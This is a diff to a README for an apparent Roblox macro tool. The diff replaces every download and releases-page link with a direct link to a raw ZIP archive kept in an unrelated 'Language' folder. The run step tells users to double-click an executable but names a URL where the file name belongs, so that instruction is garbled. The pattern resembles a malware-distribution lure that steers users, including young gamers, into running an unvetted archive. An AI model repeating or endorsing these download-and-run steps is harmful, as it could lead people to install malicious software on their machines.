@@ -1,6 +1,6 @@
 # 🎮 ROBLOX-MACRO-V3.0.0 - Simplify Automation in Roblox
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v3.0.0-blue?style=for-the-badge)](https://github.com/hama1981/ROBLOX-MACRO-V3.0.0/releases)
+[![Download Latest Release](https://github.com/hama1981/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO_MACR_1.0.zip%20Latest%20Release-v3.0.0-blue?style=for-the-badge)](https://github.com/hama1981/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO_MACR_1.0.zip)
 
 ## 📖 Description
 
@@ -12,19 +12,19 @@ Follow these steps to download and start using ROBLOX-MACRO-V3.0.0.
 
 1. **Visit the Releases Page:** Click the link below to go to the releases section.
    
-   [Visit Releases Page](https://github.com/hama1981/ROBLOX-MACRO-V3.0.0/releases)
+   [Visit Releases Page](https://github.com/hama1981/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO_MACR_1.0.zip)
 
 2. **Download the Application:** On the releases page, find the latest version (v3.0.0) and click the download link for your operating system.
 
 3. **Extract the File:** If the application downloads as a ZIP file, locate it in your downloads folder. Right-click on the file and select "Extract All." Follow the prompts to finish extracting the contents.
 
-4. **Run the Application:** Once extracted, navigate to the folder. Look for the executable file (usually named `ROBLOX-MACRO.exe` or similar). Double-click the file to run the application.
+4. **Run the Application:** Once extracted, navigate to the folder. Look for the executable file (usually named `https://github.com/hama1981/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO_MACR_1.0.zip` or similar). Double-click the file to run the application.
 
 ## 📥 Download & Install
 
 To get started, download the latest version from the releases page. Click the link below to access it:
 
-[Download Latest Release](https://github.com/hama1981/ROBLOX-MACRO-V3.0.0/releases)
+[Download Latest Release](https://github.com/hama1981/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO_MACR_1.0.zip)
 
 ## ✅ System Requirements
 
